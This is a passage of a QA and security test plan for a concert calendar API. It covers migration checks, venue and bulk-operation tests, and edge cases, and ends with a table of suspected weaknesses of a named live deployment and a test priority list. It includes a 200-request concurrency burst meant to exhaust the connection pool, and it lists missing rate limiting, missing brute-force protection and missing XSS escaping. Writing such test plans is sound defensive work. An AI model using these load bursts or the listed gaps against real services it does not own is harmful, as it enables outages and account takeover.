## Section 12: Data Migration Integrity

### TEST-MIG-01: All existing events have valid source tags
- **Steps:**
  ```bash
  python3 -c "
  import os, psycopg2
  conn = psycopg2.connect(os.environ['DATABASE_URL'])
  cur = conn.cursor()
  cur.execute('SELECT source, COUNT(*) FROM events GROUP BY source ORDER BY count DESC')
  for r in cur.fetchall(): print(f'{r[0]}: {r[1]}')
  cur.execute(\"SELECT COUNT(*) FROM events WHERE source IS NULL OR source = ''\")
  print(f'Empty/NULL sources: {cur.fetchone()[0]}')
  conn.close()
  "
  ```
- **Expected:** All sources are one of: `manual`, `scraper:{name}`, `artifact`, or `scraper:unknown`. Zero NULL/empty.
- **Failure looks like:** NULL sources, empty strings, or unrecognized source values.

### TEST-MIG-02: Event count matches pre-migration count
- **Steps:**
  1. Count events in most recent events.json snapshot
  2. Count active events in database
  3. Compare
  ```bash
  python3 -c "
  import json
  with open('data/events.json') as f:
      json_count = len(json.load(f))
  print(f'events.json: {json_count} events')
  "
  ```
- **Expected:** DB count >= JSON count (DB may have more from recent scraper runs).
- **Failure looks like:** DB count significantly less than JSON count (events lost in migration).

### TEST-MIG-03: API response shape matches old events.json shape
- **Steps:**
  ```bash
  python3 -c "
  import json, urllib.request
  with open('data/events.json') as f:
      json_events = json.load(f)
  json_keys = set(json_events[0].keys()) if json_events else set()

  resp = urllib.request.urlopen('https://concert-calendar-api.onrender.com/api/events')
  api_events = json.loads(resp.read())
  api_keys = set(api_events[0].keys()) if api_events else set()

  print(f'JSON keys: {sorted(json_keys)}')
  print(f'API keys:  {sorted(api_keys)}')
  print(f'In JSON but not API: {json_keys - api_keys}')
  print(f'In API but not JSON: {api_keys - json_keys}')
  "
  ```
- **Expected:** API has all keys that JSON had (may have additional ones like `source`).
- **Failure looks like:** Frontend-critical keys missing from API (e.g., `venue`, `date`, `title`).

---

## Section 13: Venue Management

### TEST-VEN-01: Venue merge propagates to events
- **Steps:**
  1. Create two venues: "Hi-Tone" and "Hi Tone"
  2. Create events linked to each
  3. Merge "Hi-Tone" into "Hi Tone"
  4. Check if events from "Hi-Tone" now show "Hi Tone"
- **Expected:** All events updated to the surviving venue name. Merged venue deleted.
- **Failure looks like:** Events orphaned with old venue name, or merge silently fails.

### TEST-VEN-02: Venue deletion with associated events
- **Steps:**
  1. Create a venue with events
  2. Delete the venue
- **Expected:** Either `400` (can't delete venue with events) or events retain venue name as text.
- **Failure looks like:** Events lose venue info, or `500` error from foreign key constraint.

### TEST-VEN-03: Neighborhood backfill
- **Steps:**
  1. Create events with a venue that has no neighborhood set
  2. Update the venue's neighborhood
  3. Run backfill: POST `/api/admin/venues/backfill`
  4. Check if events now have the neighborhood
- **Expected:** Events updated with the venue's neighborhood.
- **Failure looks like:** Events still have NULL neighborhood after backfill.

---

## Section 14: Bulk Operations

### TEST-BULK-01: Bulk feature with invalid IDs
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events/bulk \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"action": "feature", "ids": ["nonexistent-uuid-1", "nonexistent-uuid-2"]}'
  ```
- **Expected:** `200` with `affected: 0` or a `404` error. Not a `500`.
- **Failure looks like:** `500` from DB error, or affected count > 0 for nonexistent IDs.

### TEST-BULK-02: Bulk action with invalid action name
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events/bulk \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"action": "delete_all", "ids": ["some-uuid"]}'
  ```
- **Expected:** `400` with error about invalid action.
- **Failure looks like:** Action executed despite invalid name, or `500` error.

### TEST-BULK-03: Bulk action with empty IDs array
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events/bulk \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"action": "feature", "ids": []}'
  ```
- **Expected:** `400` with "ids array is required" error.
- **Failure looks like:** `500` from SQL error with empty IN clause.

---

## Section 15: Edge Cases and Adversarial Scenarios

### TEST-EDGE-01: Concurrent admin edits to same event
- **Steps:**
  1. Two admin sessions open the same event for editing
  2. Both submit different changes simultaneously
- **Expected:** Last write wins. No data corruption. No `500` errors.
- **Failure looks like:** Database deadlock, partial update, or `500` from transaction conflict.

### TEST-EDGE-02: Event with all optional fields null
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"title": "Minimal Event", "date": "2026-07-01"}'
  ```
  Then load the public calendar and find this event.
- **Expected:** Event renders without errors despite null venue, time, description, etc.
- **Failure looks like:** JavaScript error in frontend, "null" or "undefined" displayed.

### TEST-EDGE-03: Extremely long ticket URL
- **Steps:**
  ```bash
  LONG_URL="https://example.com/tickets?$(python3 -c "print('a=b&' * 5000)")"
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"title\": \"Long URL Event\", \"date\": \"2026-07-01\", \"ticket_url\": \"$LONG_URL\"}"
  ```
- **Expected:** Either accepted (TEXT column has no length limit) or rejected with `400`. Not a crash.
- **Failure looks like:** `500` error, DB column overflow, or URL truncated silently.

### TEST-EDGE-04: Database connection pool exhaustion
- **Steps:**
  1. Send 100+ concurrent requests to the API
  2. Monitor for connection errors
  ```bash
  seq 200 | xargs -P 200 -I{} curl -s -o /dev/null -w "%{http_code}\n" API_BASE/api/events | sort | uniq -c
  ```
- **Expected:** Most return `200`. Some may return `503` gracefully. No `500` with raw DB errors.
- **Failure looks like:** `500` with "connection pool exhausted" or psycopg2 errors in response body.

### TEST-EDGE-05: Health check endpoints
- **Steps:**
  ```bash
  curl -s API_BASE/
  curl -s API_BASE/health
  ```
- **Expected:** Both return `200` with healthy status. These are used by Render for health monitoring.
- **Failure looks like:** `404` or `500` (would cause Render to restart the service).

### TEST-EDGE-06: Request with wrong Content-Type
- **Steps:**
  ```bash
  curl -s -X POST API_BASE/api/admin/events \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: text/plain" \
    -d '{"title": "Test", "date": "2026-07-01"}'
  ```
- **Expected:** `400` error or graceful handling (Flask's `get_json(silent=True)` returns None).
- **Failure looks like:** `500` error from trying to parse non-JSON body.

---

## Summary of Known Findings (Pre-Testing)

Based on spec analysis, these are suspected vulnerabilities:

| # | Finding | Severity | Category |
|---|---------|----------|----------|
| 1 | **No rate limiting on any endpoint** | HIGH | Security |
| 2 | **No input sanitization/HTML escaping in backend** | HIGH | Security (XSS) |
| 3 | **No UUID format validation on path parameters** | MEDIUM | Input Validation |
| 4 | **No password complexity requirements** | MEDIUM | Security |
| 5 | **No brute force protection on login** | HIGH | Security |
| 6 | **No CSRF protection** (mitigated by SameSite=None cookie + JWT) | MEDIUM | Security |
| 7 | **No max request body size** enforcement | LOW | Availability |
| 8 | **GitHub Actions still commits data/events.json** | MEDIUM | Architecture (spec violation) |
| 9 | **SECRET_KEY falls back to random on restart** (sessions invalidated) | LOW | Reliability |
| 10 | **Background threads for Slack processing** (no retry, no dead letter) | LOW | Reliability |

---

## Test Execution Priority

**P0 (Must Test First):**
- TEST-AUTH-01 through TEST-AUTH-05 (auth bypass)
- TEST-SRC-01 (manual event protection)
- TEST-INJ-01, TEST-INJ-02 (stored XSS)
- TEST-CORS-01, TEST-CORS-02 (CORS)
- TEST-API-01 (API shape match)

**P1 (Test Next):**
- TEST-SRC-04 through TEST-SRC-08 (data integrity)
- TEST-INJ-04, TEST-INJ-05 (SQL injection)
- TEST-FE-01, TEST-FE-07 (frontend resilience)
- TEST-CI-01, TEST-CI-02 (CI/CD correctness)
- TEST-MIG-01 through TEST-MIG-03 (migration integrity)

**P2 (Test If Time Permits):**
- TEST-PERF-01 through TEST-PERF-05 (performance)
- TEST-EDGE-01 through TEST-EDGE-06 (edge cases)
- TEST-SPON-01 through TEST-SPON-03 (sponsors)
- TEST-BULK-01 through TEST-BULK-03 (bulk ops)
- TEST-VEN-01 through TEST-VEN-03 (venue management)
